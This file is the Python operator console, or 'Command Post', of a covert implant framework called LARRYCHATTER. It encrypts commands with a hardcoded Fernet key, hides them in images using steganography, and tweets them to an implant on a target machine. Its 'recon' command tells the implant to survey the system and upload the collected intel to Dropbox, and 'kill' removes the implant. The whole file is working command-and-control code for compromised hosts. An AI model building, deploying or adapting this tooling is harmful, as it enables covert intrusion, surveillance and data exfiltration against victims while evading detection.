from cryptography.fernet import Fernet
import stepic
import tweepy
from PIL import Image
from termcolor import colored
import pyfiglet
import sys
import os

COMMANDS = {'help':['Shows this help'],
            'recon':['Recon module. Perform reconnaisance on the target system and upload Intel on Dropbox'],
            'kill':['Kills the Implant on target machine'],
            'shutdown':['Shuts down Command Post'],
           }

# Twitter Dev Account API Keys
CONSUMER_KEY = '' 
CONSUMER_SECRET = ''
ACCESS_TOKEN = ''
ACCESS_TOKEN_SECRET = ''

# Encryption/Decryption Symmetric Key (Hardcoded) - PLEASE CHANGE IT!
key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='

def encrypt(plaintext, key):
    # Takes the plain text as string and key and encrypts and returns the encrypted text
    plaintext = plaintext.encode()
    f = Fernet(key)
    enctext = f.encrypt(plaintext)
    enctext = enctext.decode()
    return enctext

def main():
    global CONSUMER_KEY
    global CONSUMER_SECRET
    global ACCESS_TOKEN
    global ACCESS_TOKEN_SECRET
    print_banner()
    print("\n")
    CONSUMER_KEY = input(colored("Enter the Consumer Key: ", 'blue'))
    CONSUMER_SECRET = input(colored("Enter the Consumer Secret: ", 'blue'))
    ACCESS_TOKEN = input(colored("Enter the Access Token: ", 'blue'))
    ACCESS_TOKEN_SECRET = input(colored("Enter the Access Token Secret: ", 'blue'))
    print("\n")
    while True:
        command = input(colored(">> ", "blue"))
        if command == 'help':
            print("\n")
            print_help()
            print("\n")
        elif command == 'shutdown':
            print("\n")
            print(colored("[+] Command Post is shutting down...", "blue"))
            print("\n")
            sys.exit(0)
        elif command == 'kill':
            print("\n")
            imgpath = input(colored("Enter the complete path to the Image file: ", 'blue'))
            message = 'kill'
            enctext = encrypt(message, key)
            embedInImage(enctext, imgpath)
            try:
                postTweetPhoto()
                print("\n")
                print(colored("[+] kill command sent", "blue"))
                print("\n")
            except:
                print("\n")
                print(colored("[!] Unable to send kill command", "blue"))
                print("\n")
        elif command == 'recon':
            print("\n")
            imgpath = input(colored("Enter the complete path to the Image file: ", 'blue'))
            print("\n")
            api = input(colored("Enter the Dropbox API Key for Implant to upload the collected Intel: ", "blue"))
            message = command + " " + api
            enctext =encrypt(message, key)
            embedInImage(enctext, imgpath)
            try:
                postTweetPhoto()
                print("\n")
                print(colored("[+] recon command sent", "blue"))
                print("\n")
            except:
                print("\n")
                print(colored("[!] Unable to send recon command", "blue"))
                print("\n")
        else:
            print("\n")
            print(colored("[!] Command unrecognized.", "blue"))
            print("\n")

def embedInImage(message,path):
    path = path.encode()
    image = Image.open(path)
    message = message.encode()
    stegoImage = stepic.encode(image, message)
    stegoImageCWD = os.getcwd()
    stegoImagePath = stegoImageCWD + '/secret-file.png'
    stegoImage.save(stegoImagePath, 'PNG')

def postTweetPhoto():
    auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET)
    auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)
    api = tweepy.API(auth)
    stegoImageCWD = os.getcwd()
    stegoImagePath = stegoImageCWD + '/secret-file.png'
    api.update_with_media(stegoImagePath)

def print_help():
    for cmd, v in COMMANDS.items():
        print(colored("{0}:\t{1}".format(cmd, v[0]), 'blue'))

def print_banner():
    ascii_banner = pyfiglet.figlet_format("LARRYCHATTER")
    print(colored(ascii_banner, 'blue'))
    print("\n")
    print(colored("------------------------ Covert Implant Framework ------------------------", "blue"))
    print("\n")
    print(colored("Created by @UpayanSaha", "blue"))


if __name__ == "__main__":
    main()



